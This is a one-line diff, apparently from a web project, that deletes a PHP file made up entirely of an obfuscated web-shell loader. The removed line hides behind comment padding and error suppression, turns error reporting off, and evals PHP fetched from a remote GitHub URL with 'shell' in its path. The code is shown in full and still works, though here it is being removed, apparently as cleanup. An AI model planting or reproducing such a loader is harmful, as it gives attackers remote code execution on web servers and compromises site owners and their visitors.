@@ -1,1 +1,0 @@
-<?=/****/@/*55555*/null; /******/@/*55555*/error_reporting(0);/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/dvreux/shell/refs/heads/main/28success.php"))/******/ /*By Lanciau:v*/?>
